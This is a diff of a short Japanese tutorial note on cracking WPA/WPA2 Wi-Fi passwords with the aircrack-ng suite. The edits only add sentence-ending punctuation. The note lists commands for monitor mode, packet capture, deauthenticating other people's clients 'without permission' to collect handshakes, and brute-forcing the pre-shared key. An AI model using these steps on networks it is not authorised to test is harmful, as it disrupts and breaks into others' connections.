@@ -25,7 +25,7 @@ $ sudo airmon-ng check kill
 $ sudo airmon-ng start wlp3s0
 ```
 
-これでwlp3s0monというNICが生える
+これでwlp3s0monというNICが生える。
 
 ### パケットキャプチャの開始
 
@@ -34,7 +34,7 @@ $ sudo airodump-ng wlp3s0 --bssid <bssid>  -w <filename>
 $ sudo airodump-ng wlp3s0 --essid <essid>  -w <filename>
 ```
 
-filename-01.{cap,csv,kismet...}ができる
+filename-01.{cap,csv,kismet...}ができる。
 
 ### より認証時のパケットを集めるために、他人を勝手にdeauthenticateする
 
@@ -42,17 +42,17 @@ filename-01.{cap,csv,kismet...}ができる
 $ sudo aireplay-ng --deauth 1 -a <bssid> -c <client mac address> wlp3s0
 ```
 
-client mac addressはairodumpの結果から適当に引っ張ってくる
+client mac addressはairodumpの結果から適当に引っ張ってくる。
 
 ### 鍵計算
 
-WPA/WPA2 PSK(pre shared key)を総当り計算する
+WPA/WPA2 PSK(pre shared key)を総当り計算する。
 
 ```bash
 $ sudo aircrack-ng <option> *.cap
 ```
 
-optionはいろいろあるっぽい
+optionはいろいろあるっぽい。
 
 - -e <essid>
 - -b <bssid>
